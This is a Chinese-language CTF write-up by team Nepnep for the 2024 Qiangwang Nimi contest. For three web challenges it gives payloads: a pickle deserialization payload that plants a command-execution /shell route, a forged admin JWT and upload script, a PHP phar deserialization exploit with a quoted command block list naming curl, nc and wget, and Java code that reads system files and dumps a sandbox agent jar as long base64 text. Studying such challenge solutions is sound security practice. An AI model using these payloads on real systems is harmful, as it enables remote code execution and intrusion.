# 2024 强网拟态 Nepnep WP

> 原文: https://www.ctfiot.com/211007.html
> ID: 211007

2024 强网拟态 – Nepnep -WP

队伍名称：Nepnep

最终排名：1st🏆

感谢队里师傅们的辛苦付出！如果有意加入我们团队的师傅，欢迎发送个人简介至：Nepnep_Team@163.com

由于本文篇幅过长，如有需要 WP PDF 版本的师傅，请向后台发送“2024 强网拟态 WP”即可获取 WP。

Web:

ez_picker

/register 原型链污染

JSON

{

“username”: 1,

“password”: 1,

“__init__”: {

“__globals__”: {

“safe_modules”: [

“os”,

“builtins”

],

“safe_names”:[

“eval”,

“popen”

],

“secret_key”: 111

}

}

}

JSON

import pickle

class A():

def __reduce__(self):

return (eval,(‘app.add_route(lambda request: __import__(“os”).popen(request.args.get(“cmd”)).read(),”/shell”, methods=[“GET”,”POST”])’,))

a = A()

b = pickle.dumps(a)

print(b)

# 将字节流写入到文件 1.pkl 中

with open(‘1.pkl’, ‘wb’) as file:

file.write(b)

JSON

import time

import jwt

from key import secret_key

data = {“user”: 1, “role”: “admin”}

data[‘exp’] = int(time.time()) + 60 * 5

token = jwt.encode(data, str(secret_key), algorithm=’HS256′)

print(token)

上传pkl文件写内存马

JSON

import requests

# 目标 URL

url = ‘http://web-10c5ac0445.challenge.xctf.org.cn/upload’

# 文件路径

file_path = ‘1.pkl’

# 读取文件内容并发送请求

with open(file_path, ‘rb’) as file:

files = {‘file’: (‘1.pkl’, file, ‘application/octet-stream’)}

# 设置请求头

headers = {

‘User-Agent’: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0’,

‘Accept’: ‘*/*’,

‘Origin’: ‘http://web-6f5b38ec4e.challenge.xctf.org.cn’,

‘Referer’: ‘http://web-6f5b38ec4e.challenge.xctf.org.cn/upload’,

‘Accept-Encoding’: ‘gzip, deflate, br’,

‘Accept-Language’: ‘zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6’,

‘Cookie’: ‘token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MjkzMjE0ODN9.qe64g5NTlukRKtTs3aRzzl7P1zIkCUz6F7m-L58MphQ’,

‘Connection’: ‘close’

}

# 发送 POST 请求

response = requests.post(url, headers=headers, files=files)

# 打印响应内容

print(response.status_code)

print(response.text)

/shell?cmd=cat /tr3e_fl4g_1s_h3re_lol

capoo

任意文件读取读源码 showpic.php

源码

JSON

class CapooObj {

public function __wakeup()

{

$action = $this->action;

$action = str_replace(“””, “”, $action);

$action = str_replace(“‘”, “”, $action);

$banlist = “/(flag|php|base|cat|more|less|head|tac|nl|od|vi|sort|uniq|file|echo|xxd|print|curl|nc|dd|zip|tar|lzma|mv|www|~|`|r|n|t|   |^|ls|.|tail|watch|wget|||;|:|(|)|{|}|*|?|[|]|@|\|=|<)/i”;

if(preg_match($banlist, $action)){

die(“Not Allowed!”);

}

system($this->action);

}

}

header(“Content-type:
text/html;charset=utf-8”);

if ($_SERVER[‘REQUEST_METHOD’] === ‘POST’ && isset($_POST[‘capoo’])) {

$file = $_POST[‘capoo’];

if (file_exists($file)) {

$data = 9file_get_contents($file);

$base64 = base64_encode($data);

} else if (substr($file, 0, strlen(“http://”)) === “http://”) {

$data = file_get_contents($_POST[‘capoo’] . “/capoo.gif”);

if (strpos($data, “PILER”) !== false) {

die(“Capoo piler not allowed!”);

}

file_put_contents(“capoo_img/capoo.gif”, $data);

die(“Download Capoo OK”);

} else {

die(‘Capoo does not exist.’);

}

} else {

die(‘No capoo provided.’);

}

?>

src=’data:
image/gif;base64, ‘ />

远程写个phar文件，题目检测PILER字符串内容，用gzip压缩绕过

Phar文件

JSON

highlight_file(__FILE__);

class CapooObj

{

var $action=”;

}

@unlink(‘test.phar’);

$phar=new Phar(‘test.phar’);  //创建一个phar对象，文件名必须以phar为后缀

$phar->startBuffering();

$phar->setStub(“GIF89a“.””);

$o=new CapooObj();

$o->action=’whoami’;

$phar->setMetadata($o);//写入meta-data

$phar->addFromString(“test.txt”,”m1xi@n”);  //添加要压缩的文件

$phar->stopBuffering();

gzip压缩后改为gif，capoo=http://ip:
port/#下载后phar://访问

虽然报错但可以执行，然后diff读文件拿flag

读 flag-33ac806f

OnlineRunner

题目想要在不 import 任何类的情况下完成攻击。这里应该有两个思路

1、直接不 import 打，尝试如下 payload 失败

JSON

try {

Process process = java.lang.Runtime.getRuntime().exec(“echo 123”);

java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));

String line;

while ((line = reader.readLine()) != null) {

System.out.println(line);

}

process.waitFor();

} catch (Exception e) {

e.printStackTrace();

}

主要是因为题目的 Main 类没有抛出异常。目前可以使用这个 Payload 任意文件读取

JSON

try {

java.io.FileReader fr = new java.io.FileReader(“/proc/1/cmdline”);

java.io.BufferedReader br = new java.io.BufferedReader(fr);

String line;

while ((line = br.readLine()) != null) {

System.out.println(line);

}

br.close();

} catch (java.io.IOException e) {

e.printStackTrace();

}

JSON

java–add-opens=java.base/java.lang=ALL-UNNAMED-javaagent:/home/ctf/sandbox/lib/sandbox-agent.jar-jar/app/app.jar–server.port=80

列目录

JSON

java.io.File folder = new java.io.File(“/”);

java.io.File[] listOfFiles = folder.listFiles();

if (listOfFiles != null) {

for (java.io.File file : listOfFiles) {

if (file.isFile()) {

System.out.println(“File: ” + file.getName());

} else if (file.isDirectory()) {

System.out.println(“Directory: ” + file.getName());

}

}

} else {

System.out.println(“The directory does not exist or is not a directory.”);

}

然而这里最终的目标还是 RCE，以当前的 payload 没有办法很好地拿到 app.jar 的内容，于是用这个 payload 来看看 jar 包中都有什么，一步步想办法去读题目的实例类

JSON

try {

java.util.zip.ZipInputStream zis = new java.util.zip.ZipInputStream(new java.io.FileInputStream(“/app/app.jar”));

java.util.zip.ZipEntry entry;

while ((entry = zis.getNextEntry()) != null) {

System.out.println(entry.getName());

zis.closeEntry();

}

zis.close();

} catch (java.io.IOException e) {

e.printStackTrace();

}

发现这里还有个 agent，直接 Runtime 打不行，大概率就是因为有这个 rasp，下载 agent

JSON

try {

java.io.File file = new java.io.File(“/home/ctf/sandbox/lib/sandbox-agent.jar”); // 需要读取的二进制文件

java.io.BufferedInputStream bis = new java.io.BufferedInputStream(new java.io.FileInputStream(file));

byte[] buffer = new byte[1024]; // 创建一个字节数组作为缓冲区

int bytesRead;

while ((bytesRead = bis.read(buffer)) != -1) { // 循环读取

// 处理读取的数据（这里可以进行打印、处理等）

//System.out.write(buffer, 0, bytesRead);

System.out.print(‘”‘);

System.out.print(java.util.Base64.getEncoder().encodeToString(buffer));

System.out.println(“”,”);

}

} catch (

java.io.IOException e) {

e.printStackTrace();

}

JSON

import base64

data = [“UEsDBAoAAAAAAAsdRlkAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkYvUEsDBAoAAAAIAAodRllB90L8xgAAAFMBAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUadj8FOwzAQRO+R8g/+gbVacUDKre0NEVSBxH0TT4ghXiN7E6V/j9sq4sKJ486M3uy0LH5AVnpHyj5KY/Z2V1eH1I9+QfqVzxPWOZvNqKtTAiscHS+NOXxzP8K0vEDq6jj7SW96uGTv7oKjJ/dV6I92Z/cPBC4lHxCl08Q5N6aPwfLkO+7Yfi7BZhbXxdXyNWRv0WeepdRcu1noFQ6DF9wBKAhNMzZPE0seYgp/2W9QemEtO6iFjtHRORXWumXKFdjLv16rqx9QSwMECgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAABjb20vUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAMAAAAY29tL2FsaWJhYmEvUEsDBAoAAAAAAAodRlkAAAAAAAAAAAAAAAAQAAAAY29tL2FsaWJhYmEvanZtL1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L1BLAwQKAAAAAAAKHUZZAAAAAAAAAAAAAAAAHgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAwQKAAAACAAKHUZZjfQUsW8FAADNCwAANgAAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc5VWXVcTVxTdF0IGwigaCBRBSykgCWisrVYBrRWhYgNaoliktr0kAwxMZtKZCWq/1+qfaH9AV19xrVZau+xjH/pv+u5qu+9kEgKEpX3IzM255+x9Pu+dv/55+geAS/hWQ4OAvi43Zdo2/PSd+UycGxEdTYgKdBXkhjHp2Dnp3zX9Na48X9q+JzA0nAmMLGmvprO+a9qr48n9ohgEmnW0ICYQnTBt078skKhnuxCDjkMaDivtNlLX+jRpSc/LODJvuALx4aVM7SZtm3FUIJmVdn7ZeVijvGTLguEVZc64NOiNF6W/pt73NbQLHNnx4ebyupHzY0igU0OXjlfQvWu/7CMjWHHcgvQFLtaJYCmzF7BeQlrQg14Nx3WcwKsCZ3JOIS0tc1kuy/T6ZiHtlWNIy1XD9tP7I2I6fafiT7xewnvwmo5+vM6yrph2ft7wnJKbMwT6Dy5ZJZOqBoM6hpR166rhV4wV6rCOJFICh2pR2QkjB8OWfNNKT9mlguFK33TsAH9UxymFo9fge4ogreMM3hBoUwRBtPkgcIHBFzRboBaE/g==”,

“po63FEaLwgjESnpex9u4QEqXfNamEcJ2DO/DSC5oGBNo35FPPcwZReW88n1C58ywg1ssuhei1JuEe/u9a8UVvKvhqo5JXBM4GuybDncdz5DLFgvUlFNrgcZh5cb0Ljdur7nOg7LayTqE9QZKIDLp5GnQljFtY65UWDbc22WIeMbJSWtBuqb6Hwoj/prJeM5m/m9PjjMh1UET6Az1Jx3XuCHdadMybnHyBGLVXHoaPhA4Ue29WWmp0TLybMKqEj1SqMxHybUEDu9uVTZi1pe5jVlZrPhPNfrfdUDv0bHdUT8qViI/Wd9kYjfj5XENSzy96upquF+pF4s6c7MmipasuWpLv+SSafzlh2UfO88fGfbc0X3tJSAIn8jUaVzuaWHjU+seJ9uqHa6OvVgTKRWpyb7Zs6FhQ6Bvj3DO8aedkp2vCTj5UhOhaNQM1jkkSR2MwszKLcfzzKBGsWxwUqhuYo33N+FphcJT+6rj+J7vyuKs4a85ea8tCp4BPkoaNtWt9kBgYIfQtDedDSPkLV900zLnO+4jge9rwwgVy6DXyW4Z3kDGcTZKxTrDd5Ch6rk66i+4OkKISWlZWdM3xpvxSN1FzMSY4KE2Y9uGG2TCYIm+5HH5Um5r+LoyggeqkqasjD4eozq/DHh2qJuLqyh/LXgPDbjOlQ8NjXyfTkWeQSw2/s7H6FMl2oaW3UZrKn6k6Rnii40j2cXIaPZXdPyCY49p0YAZPg8H1h28ehO8Hjpxg//6yoh4HxkgWM2SWQSrOa4acFN9q1Byiz9eWnwqXz7jjrJMpEaeoG9WjP6IptGt1Mg2BmZHt7jRGFB2shuAYwykB63oxSEG1k7YHepElTqB+YA6ijZkcZsEdyhthniuvlk4VupOo42i/66W/mQt/UiZPlJDP0DIQdIPkX6Y9MkX0i/gLgk+pFSvShb3OHSvmpmP8HGQ40/IxKsrdPFvvhV7Url4eu7Un2g6taXWZ8civT+gJdUdeYJz3ZGtsUhqpHcb41uE0ulCHy6G7g+x+KoQUaQR48WtLt52nEMXzuM4LgSa/RgLwrlMrXYG+CkkrfvZKsvIcUUHqiEmwxDVKg+DLkdZ0BVaNAbBdlJSxlilZXlvlXsq7H40PoeuYe05jvD5L1UjGno0JAT/go+L1YSshwmxuD6BQtgy6aCGQFPqZxzbqnZlNBBeCYLQywqhwwI2roXGC3w38N2a+g3vCPyESOZxoBxljqbCbosH8c5TdofSLHO2UAPbGsKqaPhJPqPRjoZO4EmRHR3UFi5/D/E5/6kP6y/wFb5B939QSwMECgAAAAgACh1GWZNuBnUfFgAAyS8AADEAAABjb20vYWxpYmFiYS9qdm0vc2FuZA==”,

“Ym94L2FnZW50L0FnZW50TGF1bmNoZXIuY2xhc3OtWgl8VNXVP2cykzeZvJAwASQgEpA1q4KghEWSkJBANjMBDKDxkbwkA5OZdGYCpLZudana2iq2Fdxaa0sX2yK0Q4AK2r22drG2dret3fddbal8/3Pfm5mXZNj69Se+9+69557tnvVOnn396HEiWumaoJGLqbQ7MlBphILbjG1G5fadA5UxI9yzLbK70ugzw/HKank2GUPh7n4z6iM3eTTK1kkjL1PBdmOnURkywn2Vrdu2m91xpuwVwXAwvoopa8HCjTnko1yNdJ3yaAKTrsCDkcr6YMhkyouZg0bUiEeitf1GlIlr/WCrQKeJ5Ge6YMDYYdZGwt1GfFMw3o+vWNwIx2NM8xc0pekG4tFguG957cLxc34Ch8LCZJ2m0AVMOSmCTP5M8C4qEurTmJZlojF+KiPVLCrygfQMnS6imUwT+8x4wFJpbW9fmxHvZ5qXAX1GXG6aJRzNZroiw5ZzROKhAi/NZfKoE80Bb/N1WiAayW2q3tBS29DV3LqmTngu0amUynBS8Ui9acSHomazMch08enZHYoHQ5UAWi7bK3SqpEuYtKAcVijEFFgwBsyBSICiQwNiZI2pTyMejISTyMOmLEF9ke4dZry6pydqxmLLvbQIdmbE40Z3v1C9TKcltBRMQ9EtxoAZGzS6zTTTKdIZdCPbr9BpmWz3YntHZIcZlsnlOq2glTi8XdFg3KxWtNrN2FAIJl57TidxJgnEM5iu1Gm1HEJBe11gQ1NHV31jU11XW3VHgw82WyMuVss0OZPqNwpEnU71tBaaMHcHY+IX8LjNstCo0zq1EIyJo8lUk07NMuXtNsKbRCKNWpmmpTG3D4XjwQGzbne3OSgn4Kdsukosr51pts2C7biZ9dhCNRptgF85QRUpBI0O2iTiXI3lMbg2L9zopc04u7mx5cl/Ph9tpWs0ulanLrouyWZGTcKCcWoNkZg6eKZJCzIyt5W26dRNPbBMgLdFonGlrUYf9VKfRv06BWk7Dju9tTEcN/tMxAltpxEaMlt7maYsaHQityGAPUQDGoV1itDgqJBokcc59EaiA0Y8c1DZ4piyYmhm/XZQVKcYSYQ1BgfNMGQpcaKTEBow3zBkhrtTJwQlWyeg9u/UaZcEbU9vaCjWLzPDOr1RzXSHIjGYxJuYCtMYO/qjkV3GNjGg6+kGnW6kmxCzjZ6ewNDgoCjfBA9TnTykdsBCNboliQ1sNLamLEtM5VaxhpvEB27X6Q56K8zcTjq1ISMWa4oYPWZURZ78MT6cS3fR3Rq9Tae30z1gZ9QqrKE7ghCCwLLeHB7jO0nlbhYU79TpXroPRgBzGBONMxyCPQ==”,

“pdH9TJecOVsGxonhoz30bpH3PZkzVyb3Fhb36rSPHgSLg0PxMdHf5uecmPbSw0yLwXSFzXQFmK6wma7ojkTNipgZ3WlGK9qikd3DtZgIqLHw/ahO76X3IXGGIIqSiWnuWVKXAgPZ98N3ekyE9ciwRh/ASY4B8dHjtF+nD9GHgR/H0GzG+yOwqNVncRILv5Ni1OwNQdRKCwNIf9QKC42qYuiG/X6MPq7RJ3Q6QE/CZE+3UyJmeCcywBhPtTV5Fk+1p0Rth3T6pPhVvvKrxt62SCwWhFvIsSZ0OiyWlx01ByI7Tck1R3Q6KglossSmaGTQjMaDpgrdUiwIxKd1ekog8lNp2VKMrJ3Q6WlZm5AuMxoiA/DmzwBj2j22G9HKdUbUSghMn9Pp81KcTErvCgwOA8Ai+Qx9UUz2S4iJY4M/jPNZ+opGX9XpOfoa05xzSehIIlbU6ojURCJxrBmDDh8JmEa0G2XRNGfKdnCsMh7TN3T6pjA92VFRwV5TXDN9S6cX6NsoHsVgW6NrzN5g2HQQYlp53mWUYzts60XE3TN6k3CEYrU32Idj8tH36FGNvp88irEIvfRD2Go8ktrgpR+rxF0TDPdo9JNROQmaC5kGAuhL9DOdXpZ8rm+z5jZKkvLSL5jc27DTS7+y6pmmSLcR8tJvkL1sJoutuqm414BeeyokGv9Ojvr3Y/LJeNU4o7skvT/q9CdJqdkhM9wX7/fSX5BJrt0aK5kjq3/T6e/0D8QAZD50DrHTVDKb5dRe0elVgS0Ixloi8RoA7LDWNfoXzjJtEk3B8A6zp8GI9SPa++g18sj2/+j0umzPg9rSe+F/+E/SM7t0zmI3uIsNhoLxzGF44Zbxc17OBoqVcFv26pwjCteCsbqBwfgw6HKuzrpU5gVQNCzNQHFobURi4wk650tx52oNeHkiwviuYFh4KdR5Ek+WSszOVEzTT5/HN3sZONz9cGhBWqTzNEE6aU1dfbWUjIHqljU1rVd3NbQ2S/3OF+o8gy9i8qVZYlp7hhr8fBoJIVCs8yzRQ04wtgmGFtkV8/LFUhtdGVx47ZbKrVuvWbDFKH/jNQvVt4/n8jyN5+u8gBeOOskoaqfdlXBbVCeIDhpcalA1heVnaTVGbVwuBEp1LuPylKXBxxefrTByYGq2NgFTJV+i8aU6LxL5xrHanETu7hUH48vwNefSqkrZt1TnyyUu6VFzMITeoz4YjcW9vAxqCif7ES8vVwlRnYmX0Vp44tJsePlKJiSLauAbRPAXJdfqvEbwTU3HuXRekFDn5Xr43dzYStTLPm7gRo3XoTrk9UnGHdqrGQqGVOQ7g2bHg8P2m5k6l3f39gmR2HAsbg50DUR6hkKmTOBLvQ==”,

“7ajSJRYq4yEUEw4wSLQzCHTynVKF4hpiturcNiYHNaudIqKYe7vOATH3qUkz3xCoa5dedUOqUWLeoPNGwTJllLIUVZUVuIFqvNypun9V5wQHvbwFZ3FJhfpPcFyj87XcBU6sJFUfjQw429/W8ZpLqum/8ayNXjYQ9W12BtGNeLkbgeYSOUpT515perzxSDLHP879OgcZDUqhVSHEUWggqa6JDCCASH9mH2PM7B5CvT9cORYGRhLiAY3DOkcYAl10ZnCEUhCqxREHIkNR6aUvHEcivQrkUY5pHNd5iHcm66sMgFZVJinJKgkKFjja/A3tTUC0m4c1fqPO14sKdOei1brZ/Sy/Wecb+EaLzzYjijLDulJKoUyWKwJ8s863CL6cFLAfCW+Wj2/j2zW+Q+e38p2jGzdl7Tb2lONJs+OMH+kVOMvdQC+2XyGO4OO38z0av0Pndyr7zrTHUoY9HvaTl2ZpvAe9SBoYGQI6FH4ra1OfyeTH95HHy++GWiKxCnEtEeceyTB7dd4n4qKsaIrsMqO1Rgyamei46emqXlvX0gH5kpdqqnyQOzEnTEdHdW0DxAoE+8LKF5g2jDb3FRnM/Xzbo+WrEBcvqG2qDgS6Wuu7alvb6/BoqW9cu6G9DhVhaqWtvfXqTmsdUWBjXTsMpK65raOzK9DR3tiCmF2wvq5zVEaEhDLVUt1cF2irrsV4YjJxOuYUjIWyq7ENuTMJI4N8x2JbazuUpieXrWGOAHS0rq9rAabkkj2eKmvgu62uvaOxLpC+4EGsF7eQ9hb1acvQwDYz2iGllZyBlGwbjWhQxvakO94fhMWUn0W7o65ql0uISfcDMBQ07ZZ3Lz9zoXeme7mNkLLX2YKAOYGH4Z4bBmhMMWtx4ut1hNkpo0UfHkyKv+TsZjduRszK1bsL3jcqINj3IYi2wDs5teS4n8CaJySMIOqd6Q5PVQLC3YTREQcKCqDC3gFGbfZzu50NyKLzdxFVH6k+BxpLMRqTkBNO3bT6x9+gYFKRbu1Vvb3V10soGNtNp7SUnltRIhrkeEpLY3oAOO1peiQ4ok011dUASUS1xzLnaI9GX8PbHTTSXBJ4FNu8WW6qjCGJZv7BcX0y5BIl1Y82zuEF/5Xt/A9uqVGgxWwm8nqc3QEsZsfOgNkneKqjUWMYAmdoPjC7Y2ebEYzaoMnN/lGzCoHGP2JqPPsd/Tk7TtaA+GPWDrlE023m7Rwx8P9W6Pm0HDh15OGi01btabHPk5+MtHKSka0mRTNDycc0dK714P9SOYi83hXdIfvXNZ9VUllVj39U4K+QvXDC1EWLdbsVy8/mv/j4r/w3jf+u00T+x5i7G7n5sqlZP7vVG93xSBQm8MCCpg==”,

“cYAW0gbEnJAZm9MUiewYOkv5O2qjRPcM4Ge5Y7NR1CLgBRDHUXe9gpjAjC7Fy69BQcxW7+HlfyOfMCPKsh0Xy9XtzHYj6uX/IB6NXosNDltLpxAKOTldkY4yXhdD6czJhsbrymIqVj8OFccjxVH101CxJITiqmJO3q54XR4cRApfuc2cS1OzqXsj1QjC0xrDYZRrEjvNmObyMc09J7VrLj1Z0p8WFNHIAqZZhMxFRJNpmlwm4GuadFnq/SDezA/h20VzMH7YMb6UfPKbocDJz1bqfQe9FeuPyDo/Cvj3OuC/g/H7HOOHMH4sPeZVGL/fMZ6C8eOO8RUYf8AxrsL4g47x1Rjvd4w3Y/whx/g6jD/sGG/D+COO8QqMPzqGnycc49UY59tysvzcjZWPYVQp10p4e0oOU9aTCvTjeGaryWn8CTx1C4APsKz75Gdge/NlUISs+UoOUs5Ryic6MAbDDAcGHx9UDPikT86MoXA8hlmZMMjFqY3hcspSa3mC4SBNOkpTxyOZ60CSl0Ly+TMgmT4eycJMSORqI4XEZSMZoQsVkuLxSMozItl4OoVcPB7DpRkUksOH+JM2hvXA4MI73z/nEM0DLwtLR6h8U/psJ0BYoq3koWvwfa1CN8Xawp9S6OQrwYdBIodHUojvgKPJzun+S23EzWUjtBj/X14mJEaoSohkKSKzYWFE/SAShKa3Uy7tgH2EaBINgMR2WGFEES62UKYIT7cJ+xDSj8AfXXzUllbN8DEwWiI/ZltM8V5oRQPE/cfI13mQVh2m6pbyBK3ZSzPxathLPrzW76OJx6ils/wotREdpsCJY9TRWe4+TBur3EVuf6f2FLk7s0oCne7SQKenLEFbAp3ZeBkjZAZGaEeC3rCpyJ2gIXns3k9FVR77S6/KLvIUZSfozUWeE/spv8othIqA+i0nnoRsy6iXwnQ9DdIQ7ca7gm6FIm+2tbSO5G9EboB2boTt3wSt3AyN3KKgltFt1ER3UoDuos10Ow7rNjLo7cB3DzDeiv/eCUz3AOIdtIf2KG2ugjaW0Xr+NEMgrPj4OJ9Q8fF+XmZr+H5eKXFBfT3Nz0CfuXQnf4Y/C54+h9m15D1JxRr58k7RlfLnMSH1bytmNOog1uj6U5RD2WMWMK3WvK+Rq0ajm3NxTC/Qt3GAYjsftW1n9UG6reQI3emivVTM1uAdLvoAFaa+n6Y9zftp6jHa01lSepje1SwrZUfogSzaVHYgZWDTICohDE+kh6mIHqGF9H5aTI9DBfuVKkpAcR5gP89fULa9OqWA1fxFpYDFcEC1qsTOIdfCkzRJgya/hKEbANfD5b9MtbYIX7FFaHZy2sSlHyT3k6X+hxL0SHOZ/7Gspw==”,

“6PEEfbDM/xH7i/GGqTxhvzaVJuigheFTLlJe6VbyzAMHRAcpjw7BKD4JcxiBjEeolI5Cpqeoho7DHE44nKbZligPEj0LORjwi/kr/FWH01gzz9kyIuifpMLRIpbI37hYIrqegU7z4FST4dyLm/EYacHjWJUbz+NVntJj9Eyn+FmRZ4Q+C087TF84Ql92UZlMfH2EnoczZPu/k6DvVmlFmv8HHqigM8sfgl/hIcrwKEcrcmOmHBNPVHmx4SHZkFOUM05nVT5M/sieLPLZs0/TSwn66dLcybn7qAEAP7fIFGlC5tmAArXpeJVHi9r304wqHcCPjcW2qUg/gflfjqey9UCVR5zZ/+siz2H67QmY0UfoeZj09Sh3ssXW7aO7RQI97MNDX0WUeo4K6BsIqM+jNvkW1Ps8FPxdWkTfpyV4V9FLsKifwYtfRkT8JcXpN/Qm+i28+Xfw1z/CE/4KKn+nT9M/6Gv0T+z+Fyi+Qi/Sq/R7eo3+RKfoFfVbEHM2nWKN3ZzDHmUW9yCcv0hT+Wv8dZK/EfsLXwAD8YDmczCQb+Bwa+lz/E0YiAbaD/Hz/C2YRBzmIEaTA/o38AuY84GLbfRj/jblcg7p/B3g84hZqIhM6suK0h4uUEboQqTJ5RfxlQXdePi7+HIrIxRTtag+B6oWrefE1AUbojkpw2ygrFMQU9foLo2eTUYW69/3NHpcI7f1ZBVjik6JXGOA1YpdvX0PMrwKDVqJa6udU6dzCUqwkgT94REqKPH/OUF/3Ueaez+5s55IxRX5IzXiYsrmWciCs1EDFTsS7nT+vvicYtpDrqLVkpdeT1GqsaspKQH+OR63SuA8b1QJMApfruCTn+FsfJsB5Eri20taCfCVHhjDawlpXIqjKsNRlTiyuY1bff1AlYJCRRMqoi6f/G2c5fh8FRBJvr7xGL3WeZj+3QR6J/eSp/RAif9Ugrm57Pg+GZW1lB9f6s5a6pnsmex+jK4qn+xZJD6voLP3U1VRdiF7sEH8/7jnvbSwSMtahNV9NLNIcy9KwvlLZV5mrLh+q4f3n/q4ksxyqXrEdeJL0AItxilchtR/BQx7GerJKpqJBLYEBe5KvhKRr5rWcQ1t4FrqQi1mch3181raBZg38zqljcug2XUovH7IP4L0S6iGfwxtSPa40S47vIAX02bUjn38EuDSEVStwVAt7S0g7SRNhOWdpDyNf/I6efFkRNULoNKTNB+j12jCq3AMyxB/iuOcwRfZKeQunItE7lliiDNKjsB7aR9NKim100mobIR9OOKytCKsI26lCerHpauQNFscKWAW/8zySHy9bGf1Wfxz8ciUAAoq5Wk4/ply/DZ/vwB/s5DyLXObrewGZeVBzg==”,

“K+SCBPvFdtlhu5tgNk/TUlueR8GEsFFeUshTDvLUEZ7eNMIz99KMQp49wnNKE1zSXJbgir2UW1bIixO8pMlxyCqF81aY7jU44GvpQu6ii9HplHJ3SsYLcfy/5F8pxsrt+JNLs1VkY4eM5Y5ootJcaVrIX4PpJSmm19q1fi6YvqKQq8B02qMsKfsdHpprEXWQyrVJpZEvy4h8RSGvyoB84DyRH00hD9jI84F8taTkEa4ZRUBV9hyF9Q0BUdRBKH8cofyxhOQ3Q5vQfVChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZAQAAY29tL2FsaWJhYmEvanZtL3NhbmRib3gvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAB4AAAAAAAAAAAAQAP1BzwEAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1BLAQIUAwoAAAAIAAodRg==”,

“WY30FLFvBQAAzQsAADYAAAAAAAAAAAAAALSBCwIAAGNvbS9hbGliYWJhL2p2bS9zYW5kYm94L2FnZW50L1NhbmRib3hDbGFzc0xvYWRlci5jbGFzc1BLAQIUAwoAAAAIAAodRlmTbgZ1HxYAAMkvAAAxAAAAAAAAAAAAAAC0gc4HAABjb20vYWxpYmFiYS9qdm0vc2FuZGJveC9hZ2VudC9BZ2VudExhdW5jaGVyLmNsYXNzUEsFBgAAAAAJAAkAeAIAADweAAAAAFChFI3zS8vsWm0mSNZZSbVMcmpZOQirypjXOooYi4EbgOxGmsc3pwoxoOLf8G+Vcc23XU2+Xla5Q77EZrMc7M13OF2WxEyLz99BIU+lFPICzFns7zpRRtMxbugs5KYCq5hHR3KhcDrCLSjpD9I8VPQo7rWDfFWg04vpjkBnQbYUOiLGYd7UXAYZry7kzSO8VT6vK+Rt8pngnrSGS0Cf+DZo+HaaxHciH9xNi/hequI9tIrvoDp+gNr4QdrCDzvc9DrbcD2YP6jctA47RSFON71uzIl4+fepNv1uhYdok5RffmTfvgRD929I8C7UYQl+U4JvOsRT4YPSePJbiA7xVSN8ayHfleC3qbl7MUerjvF9nYf5/kN0WyG/a4Tfk+AHDnHekyk3t/q2pbDVy2kyIejCuC+i5cgUjbSamhFsO6CKPygW/8h/wvsKNIl/xu5/quer6vkv9Typnq/LEwlYni71dKtntkso+fCV48p15VHR/wFQSwECFAMKAAAAAAALHUZZAAAAAAAAAAAAAAAACQAAAAAAAAAAABAA7UEAAAAATUVUQS1JTkYvUEsBAhQDCgAAAAgACh1GWUH3QvzGAAAAUwEAABQAAAAAAAAAAAAAAKSBJwAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAAAQAAAAAAAAAAAAQAP1BHwEAAGNvbS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAADAAAAAAAAAAAABAA/UFBAQAAY29tL2FsaWJhYmEvUEsBAhQDCgAAAAAACh1GWQAAAAAAAAAAAAAAABAAAAAAAAAAAAAQAP1BawEAAGNvbS9hbGliYWJhL2p2bS9QSwECFAMKAAAAAAAKHUZZAAAAAAAAAAAAAAAAGAAAAAAAAAA